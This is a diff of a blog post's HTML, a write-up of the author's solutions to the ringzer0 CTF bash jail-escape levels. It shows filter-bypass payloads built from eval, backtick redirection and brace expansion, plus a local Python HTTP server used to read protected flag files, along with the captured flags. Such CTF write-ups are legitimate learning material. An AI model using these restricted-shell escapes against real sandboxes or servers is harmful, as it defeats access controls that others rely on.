@@ -60,7 +60,7 @@
                            <ul class="dropdown-menu">
                                <li><a href="http://blog.dornea.nu/category/blog">
                                       <i class="icon-pencil"></i>blog
-                                      (114)</a></li>
+                                      (116)</a></li>
                                <li><a href="http://blog.dornea.nu/category/low">
                                    <i class="icon-folder-close"></i>LOW
                                       (27)</a></li>
@@ -122,7 +122,7 @@
                 <div id="niu2-main-content">
                     <p>Here are my solutions for the <a href="https://ringzer0team.com">ringzer0</a> <strong>Jail Escaping</strong> shell challenges.</p>
 <h1 id="63664aa8bee7544118de87bf48d529ee">Level1</h1>
-<div class="highlight"><pre>evel1@ringzer0team.com<span class="err">'</span>s password: 
+<div class="highlight"><pre><span></span>evel1@ringzer0team.com<span class="err">'</span>s password: 
 
 RingZer0 Team Online CTF
 
@@ -137,21 +137,21 @@ Challenge bash code:
 <span class="k">while</span> :
 <span class="k">do</span>
         <span class="nb">echo</span> <span class="s2">"Your input:"</span>
-        <span class="nb">read </span>input
+        <span class="nb">read</span> input
         <span class="nv">output</span><span class="o">=</span><span class="sb">`</span><span class="nv">$input</span><span class="sb">`</span>
 <span class="k">done</span> 
 
 -----------------------------
 </pre></div>
 <p>You can spawn a shell using:</p>
-<div class="highlight"><pre>/bin/bash
+<div class="highlight"><pre><span></span>/bin/bash
 </pre></div>
 <p>Although you <strong>can't read</strong> (you could redirect <em>stdout</em> to <em>stderr</em>) files, you can try to <strong>run</strong> commands based on the file content:</p>
-<div class="highlight"><pre>level1@lxc17-bash-jail:~<span class="nv">$ </span>awk <span class="s1">'{system("wc "$1)}'</span> /home/level1/flag.txt 
+<div class="highlight"><pre><span></span>level1@lxc17-bash-jail:~$ awk <span class="s1">'{system("wc "$1)}'</span> /home/level1/flag.txt 
 wc: FLAG-U96l4k6m72a051GgE5EN0rA85499172K: No such file or directory
 </pre></div>
 <h1 id="228e9da47384bacde793a2b78d488bb0">Level 2</h1>
-<div class="highlight"><pre>level2@ringzer0team.com<span class="s1">'s password: </span>
+<div class="highlight"><pre><span></span>level2@ringzer0team.com<span class="s1">'s password: </span>
 
 <span class="s1">RingZer0 Team Online CTF</span>
 
@@ -190,12 +190,12 @@ Your input:
 </pre></div>
 <p>Since you are not allowed to use certain characters like ";", "&amp;", "]", "b", "d" and so on, you must think of some way to read 
 content of <code>/home/level2/flag.txt</code>. In my case the following worked:</p>
-<div class="highlight"><pre><span class="sb">`</span>&lt;/home/level2/flag.txt<span class="sb">`</span>
-Your <span class="nb">command </span>is: FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P
+<div class="highlight"><pre><span></span><span class="sb">`</span>&lt;/home/level2/flag.txt<span class="sb">`</span>
+Your <span class="nb">command</span> is: FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P
 Your input:
 </pre></div>
 <h1 id="8f60a63315c55e659b1a2dd5064ceae8">Level 3</h1>
-<div class="highlight"><pre>level3@ringzer0team.com<span class="s1">'s password: </span>
+<div class="highlight"><pre><span></span>level3@ringzer0team.com<span class="s1">'s password: </span>
 
 <span class="s1">RingZer0 Team Online CTF</span>
 
@@ -237,22 +237,22 @@ Your input:
 Your input:
 </pre></div>
 <p>The problem here is that <strong>stderr</strong> is being redirected to <code>/dev/null</code>:</p>
-<div class="highlight"><pre><span class="n">WARNING</span><span class="o">:</span> <span class="k">this</span> <span class="n">prompt</span> <span class="k">is</span> <span class="n">launched</span> <span class="n">using</span> <span class="o">./</span><span class="n">prompt</span><span class="o">.</span><span class="na">sh</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="kc">null</span>
+<div class="highlight"><pre><span></span><span class="n">WARNING</span><span class="o">:</span> <span class="k">this</span> <span class="n">prompt</span> <span class="k">is</span> <span class="n">launched</span> <span class="n">using</span> <span class="o">./</span><span class="n">prompt</span><span class="o">.</span><span class="na">sh</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="kc">null</span>
 </pre></div>
 <p>The 2nd problem is that <strong>stdout</strong> <em>and</em> <strong>stderr</strong> are also redirected to <code>/dev/null</code>:</p>
-<div class="highlight"><pre><span class="x">output=`</span><span class="p">$</span><span class="nv">input</span><span class="x">` &amp;&gt;/dev/null</span>
+<div class="highlight"><pre><span></span><span class="x">output=`</span><span class="p">$</span><span class="nv">input</span><span class="x">` &amp;&gt;/dev/null</span>
 </pre></div>
 <p>But fortunately we are allowed to use <code>eval</code> (which doesn't match against the regexp in <code>check_space</code>). If I'd execute:</p>
-<div class="highlight"><pre><span class="nb">eval</span> <span class="k">$(</span>&lt;/home/level3/flag.txt<span class="k">)</span>
+<div class="highlight"><pre><span></span><span class="nb">eval</span> <span class="k">$(</span>&lt;/home/level3/flag.txt<span class="k">)</span>
 </pre></div>
 <p>this would cause an error since the shell cannot execute the command associated with the content in the flag file. But since <strong>stderr</strong> is redirected I had to redirect again to sth else, like <strong>stdin</strong> (0):</p>
-<div class="highlight"><pre>Your input:
+<div class="highlight"><pre><span></span>Your input:
 <span class="nb">eval</span> <span class="k">$(</span>&lt;/home/level3/flag.txt<span class="k">)</span> 2&gt;<span class="p">&amp;</span>0
-./real.sh: line 39: FLAG-s9wXyc9WKx1X6N9G68fCR0M78sx09D3j: <span class="nb">command </span>not found
+./real.sh: line 39: FLAG-s9wXyc9WKx1X6N9G68fCR0M78sx09D3j: <span class="nb">command</span> not found
 Command executed
 </pre></div>
 <h1 id="309531bbe9a9d3228cd0687ec6e66bed">Level 4</h1>
-<div class="highlight"><pre>level4@ringzer0team.com<span class="s1">'s password: </span>
+<div class="highlight"><pre><span></span>level4@ringzer0team.com<span class="s1">'s password: </span>
 
 <span class="s1">RingZer0 Team Online CTF</span>
 
@@ -299,11 +299,11 @@ Your input:
 <li><strong>somehow</strong> GET the flag.txt file</li>
 </ul>
 <p>Starting a web server was easy:</p>
-<div class="highlight"><pre>Your input:
+<div class="highlight"><pre><span></span>Your input:
 python -m SimpleHTTPServer
 </pre></div>
 <p>Now I had to download the file using <code>http://127.0.0.1:8000</code>. Then I've realized that for <strong>level1</strong> I had a <code>bash</code> I could use to download the file:</p>
-<div class="highlight"><pre>level1@lxc17-bash-jail:~$ netstat -tan 1&gt;&amp;0
+<div class="highlight"><pre><span></span>level1@lxc17-bash-jail:~$ netstat -tan 1&gt;&amp;0
 Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State      
 tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN     
@@ -313,18 +313,18 @@ tcp        0      0 10.0.3.26:22            195.178.101.66:13279    ESTABLISHED
 tcp6       0      0 :::22                   :::*                    LISTEN     
 </pre></div>
 <p>As you can see the web server is running on port <code>8000</code>. Since <code>wget</code>, <code>curl</code> or other HTTP clients were not available, I had to run python again in order to get the file:</p>
-<div class="highlight"><pre><span class="n">level1</span><span class="nd">@lxc17</span><span class="o">-</span><span class="n">bash</span><span class="o">-</span><span class="n">jail</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="mi">1</span><span class="o">&gt;&amp;</span><span class="mi">0</span>
+<div class="highlight"><pre><span></span><span class="n">level1</span><span class="nd">@lxc17</span><span class="o">-</span><span class="n">bash</span><span class="o">-</span><span class="n">jail</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="mi">1</span><span class="o">&gt;&amp;</span><span class="mi">0</span>
 <span class="n">Python</span> <span class="mf">3.4</span><span class="o">.</span><span class="mi">3</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">Oct</span> <span class="mi">14</span> <span class="mi">2015</span><span class="p">,</span> <span class="mi">20</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">29</span><span class="p">)</span> 
 <span class="p">[</span><span class="n">GCC</span> <span class="mf">4.8</span><span class="o">.</span><span class="mi">4</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux</span>
-<span class="n">Type</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"copyright"</span><span class="p">,</span> <span class="s">"credits"</span> <span class="ow">or</span> <span class="s">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
+<span class="n">Type</span> <span class="s2">"help"</span><span class="p">,</span> <span class="s2">"copyright"</span><span class="p">,</span> <span class="s2">"credits"</span> <span class="ow">or</span> <span class="s2">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">urllib.request</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="s">"http://127.0.0.1:8000/flag.txt"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-<span class="n">b</span><span class="s">'FLAG-OTQKB0274fwtxk3v2rTLCd0l5v7KNp7F</span><span class="se">\n</span><span class="s">'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="s2">"http://127.0.0.1:8000/flag.txt"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<span class="n">b</span><span class="s1">'FLAG-OTQKB0274fwtxk3v2rTLCd0l5v7KNp7F</span><span class="se">\n</span><span class="s1">'</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="n">quConnection</span> <span class="n">to</span> <span class="n">ringzer0team</span><span class="o">.</span><span class="n">com</span> <span class="n">closed</span><span class="o">.</span>
 </pre></div>
 <h1 id="05988e43e8f2eb5efdddc2b467c4b2f3">Level 5</h1>
 <p>The last one was indeed <strong>very difficult</strong>. But before going into details, let's have a look at the prompt:</p>
-<div class="highlight"><pre>RingZer0 Team Online CTF
+<div class="highlight"><pre><span></span>RingZer0 Team Online CTF
 
 BASH Jail Level 5:
 Current user is <span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>level5<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>level5<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1004<span class="o">(</span>level5<span class="o">)</span>
@@ -336,7 +336,7 @@ Challenge bash code:
 
 WARNING: this prompt is launched using ./prompt.sh 2&gt;/dev/null
 
-<span class="c"># CHALLENGE</span>
+<span class="c1"># CHALLENGE</span>
 
 <span class="k">function</span> check_space <span class="o">{</span>
         <span class="k">if</span> <span class="o">[[</span> <span class="nv">$1</span> <span class="o">==</span> *<span class="o">[</span>bdksctr<span class="s1">'?''*''/''&lt;''&gt;''&amp;''$'</span><span class="o">]</span>* <span class="o">]]</span>
@@ -350,7 +350,7 @@ WARNING: this prompt is launched using ./prompt.sh 2&gt;/dev/null
 <span class="k">while</span> :
 <span class="k">do</span>
         <span class="nb">echo</span> <span class="s2">"Your input:"</span>
-        <span class="nb">read </span>input
+        <span class="nb">read</span> input
         <span class="k">if</span> check_space <span class="s2">"</span><span class="nv">$input</span><span class="s2">"</span> 
         <span class="k">then</span>
                 <span class="nb">echo</span> -e <span class="s1">'\033[0;31mRestricted characters has been used\033[0m'</span>
@@ -369,13 +369,13 @@ Your input:
 <p>The idea was to start vim, <strong>read</strong> the flag.txt and write the buffer to sth like <code>/dev/shm/buffervim</code>. But vim has some problems starting when STDIN=<code>/dev/null</code>. At the beginning I saw <code>vim</code> starting but then it disapeared suddenly. It took me a file to find out that starting vim with STDIN != some tty would be tricky. </p>
 <h2 id="ea09870840f290c09f5be21282840cb8">Create another file</h2>
 <p>Since I was able to read the file easily:</p>
-<div class="highlight"><pre><span class="nv">$ </span>uniq flag.<span class="o">[</span>a-z<span class="o">][</span>a-z<span class="o">][</span>a-z<span class="o">]</span>
+<div class="highlight"><pre><span></span>$ uniq flag.<span class="o">[</span>a-z<span class="o">][</span>a-z<span class="o">][</span>a-z<span class="o">]</span>
 </pre></div>
 <p>... I thought I could create a new file inside <code>/home/level5/</code> by using <code>uniq</code>:</p>
-<div class="highlight"><pre><span class="nv">$ </span>uniq flag.<span class="o">[</span>a-z<span class="o">][</span>a-z<span class="o">][</span>a-z<span class="o">]</span> new_file
+<div class="highlight"><pre><span></span>$ uniq flag.<span class="o">[</span>a-z<span class="o">][</span>a-z<span class="o">][</span>a-z<span class="o">]</span> new_file
 </pre></div>
 <p>That didn't work and it took some some while to understand <strong>why</strong>. Using <code>lsattr</code> I've checked the attributes on <code>/home/level5</code>:</p>
-<div class="highlight"><pre>level1@lxc17-bash-jail:/home/level5<span class="nv">$ </span>lsattr -a&gt;<span class="p">&amp;</span>0
+<div class="highlight"><pre><span></span>level1@lxc17-bash-jail:/home/level5$ lsattr -a&gt;<span class="p">&amp;</span>0
 ----i--------e-- ./.
 ----i--------e-- ./..
 ----i--------e-- ./real.sh
@@ -384,30 +384,30 @@ lsattr: Permission denied While reading flags on ./flag.txt
 ----i--------e-- ./.bash_logout
 ----i--------e-- ./.bashrc
 ----i--------e-- ./.profile
-level1@lxc17-bash-jail:/home/level5<span class="nv">$ </span>
+level1@lxc17-bash-jail:/home/level5$ 
 </pre></div>
 <p>As you can see <code>/home/level5</code> is set to <strong>immutable</strong> (i) which means that I can't modify files in that directory or create new ones. </p>
 <h2 id="1854d1e99fd652fe2503d7c69b443491">Use bash magic voodoo</h2>
 <p>Desperately searching for some solution, I've asked <a href="https://ringzer0team.com/profile/8593/maxenced">maxenced</a> (who was the last one having solved this level)  for some additional hint. BTW: I've "bought" the hint for this hint very early, but it didn't help a lot. Anyway... He told me I should use <strong>bash brace expansions</strong>. 
 Okay, so let's have a look and see what we can do using them:</p>
-<div class="highlight"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="o">{</span>a..z<span class="o">}</span>
+<div class="highlight"><pre><span></span>$ <span class="nb">echo</span> <span class="o">{</span>a..z<span class="o">}</span>
 a b c d e f g h i j k l m n o p q r s t u v w x y z
 
-<span class="nv">$ </span><span class="nb">echo</span> <span class="o">{</span>1..10..2<span class="o">}</span>
+$ <span class="nb">echo</span> <span class="o">{</span>1..10..2<span class="o">}</span>
 <span class="m">1</span> <span class="m">3</span> <span class="m">5</span> <span class="m">7</span> 9
 
-<span class="nv">$ </span><span class="nb">echo</span> <span class="o">{</span>o..u<span class="o">}</span>ython
+$ <span class="nb">echo</span> <span class="o">{</span>o..u<span class="o">}</span>ython
 oython python qython rython sython tython uython
 </pre></div>
 <p>So obvisouly we can <strong>bypass</strong> the restricted characters by simpling iterating through a range of 
 characters. Now the next step was to find a way how to <strong>expand shell commands</strong> (and this was the
 most imporant part - thx again <a href="https://ringzer0team.com/profile/8593/maxenced">maxenced</a>). I've tried sth 
 like:</p>
-<div class="highlight"><pre><span class="nv">$ </span><span class="nb">eval</span> <span class="o">{</span>o..u<span class="o">}</span>ython
-bash: oython: <span class="nb">command </span>not found
+<div class="highlight"><pre><span></span>$ <span class="nb">eval</span> <span class="o">{</span>o..u<span class="o">}</span>ython
+bash: oython: <span class="nb">command</span> not found
 </pre></div>
 <p><code>eval</code> was <strong>not</strong> expanding the commands. Then I've tried sth different:</p>
-<div class="highlight"><pre><span class="nv">$ </span><span class="sb">`</span><span class="nb">echo echo</span> <span class="o">{</span>o..u<span class="o">}</span>ython<span class="se">\\</span><span class="p">;</span><span class="sb">`</span>
+<div class="highlight"><pre><span></span>$ <span class="sb">`</span><span class="nb">echo</span> <span class="nb">echo</span> <span class="o">{</span>o..u<span class="o">}</span>ython<span class="se">\\</span><span class="p">;</span><span class="sb">`</span>
 oython<span class="p">;</span> python<span class="p">;</span> qython<span class="p">;</span> rython<span class="p">;</span> sython<span class="p">;</span> tython<span class="p">;</span> uython<span class="p">;</span>
 </pre></div>
 <p>Now let me explain the changes:</p>
@@ -416,19 +416,19 @@ oython<span class="p">;</span> python<span class="p">;</span> qython<span class=
 <li>I've added <strong>\;</strong> at the end which simply adds a semicolon (;) at the end of each expansion</li>
 </ul>
 <p>If I change the <code>echo</code> to <code>eval</code>, then <code>eval</code> will basically run:</p>
-<div class="highlight"><pre>oython<span class="p">;</span> python<span class="p">;</span> qython<span class="p">;</span> rython<span class="p">;</span> sython<span class="p">;</span> tython<span class="p">;</span> uython<span class="p">;</span>
+<div class="highlight"><pre><span></span>oython<span class="p">;</span> python<span class="p">;</span> qython<span class="p">;</span> rython<span class="p">;</span> sython<span class="p">;</span> tython<span class="p">;</span> uython<span class="p">;</span>
 </pre></div>
 <p>Afterwards I've found out that <code>python</code> refused to start if STDIN = <code>/dev/null</code> (the same as with <code>vim</code>). Then
 I remembered the solution in a previous level where I've start a <strong>HTTP server</strong> (using <code>python</code>) to "download" 
 the flag.txt. So all I wanted to run was:</p>
-<div class="highlight"><pre><span class="nv">$ </span>python -m SimpleHTTPServer
+<div class="highlight"><pre><span></span>$ python -m SimpleHTTPServer
 </pre></div>
 <p>As you may have noticed "SimpleHTTPServer" contains restricted characters like <strong>r</strong>. So we'll have to use <em>brace expansion</em> again:</p>
-<div class="highlight"><pre><span class="nv">$ </span><span class="sb">`</span><span class="nb">echo echo</span> <span class="o">{</span>u..o<span class="o">}</span>ython<span class="se">\ </span>-m<span class="se">\ </span>SimpleHTTPSe<span class="o">{</span>u..o<span class="o">}</span>ve<span class="o">{</span>o..u<span class="o">}</span><span class="se">\\</span><span class="p">;</span><span class="sb">`</span>
+<div class="highlight"><pre><span></span>$ <span class="sb">`</span><span class="nb">echo</span> <span class="nb">echo</span> <span class="o">{</span>u..o<span class="o">}</span>ython<span class="se">\ </span>-m<span class="se">\ </span>SimpleHTTPSe<span class="o">{</span>u..o<span class="o">}</span>ve<span class="o">{</span>o..u<span class="o">}</span><span class="se">\\</span><span class="p">;</span><span class="sb">`</span>
 ...
 </pre></div>
 <p>The next step was to properly escape the backslashes to make sure that eval is executing the right thing. So the final payload was:</p>
-<div class="highlight"><pre><span class="nv">$ </span><span class="nb">eval eval </span>py<span class="o">{</span>o..u<span class="o">}</span>hon<span class="se">\\</span> -m<span class="se">\\</span> SimpleHTTPSe<span class="o">{</span>q..v<span class="o">}</span>ve<span class="o">{</span>q..v<span class="o">}</span><span class="se">\\</span><span class="p">;</span> 
+<div class="highlight"><pre><span></span>$ <span class="nb">eval</span> <span class="nb">eval</span> py<span class="o">{</span>o..u<span class="o">}</span>hon<span class="se">\\</span> -m<span class="se">\\</span> SimpleHTTPSe<span class="o">{</span>q..v<span class="o">}</span>ve<span class="o">{</span>q..v<span class="o">}</span><span class="se">\\</span><span class="p">;</span> 
 </pre></div>
 <p>I would also want to thank David, Ralph and Tobias for their awesome ideas and the great hacking session we had on Friday :)</p>
                 </div>
@@ -470,9 +470,9 @@ the flag.txt. So all I wanted to run was:</p>
                     <div class="niu2-sidebar-label"><i class="icon-pencil"></i>category:</div>
                     <div class="niu2-sidebar-value"><a href="http://blog.dornea.nu/category/blog">blog</a></div>
                     <div class="niu2-sidebar-label"><i class="icon-tag"></i>Tag:</div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ringzer0/">ringzer0</a><sup>5</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ctf/">ctf</a><sup>8</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>13</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ringzer0/">ringzer0</a><sup>7</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ctf/">ctf</a><sup>10</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>15</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/bash/">bash</a><sup>1</sup></div>
                 </div>
 
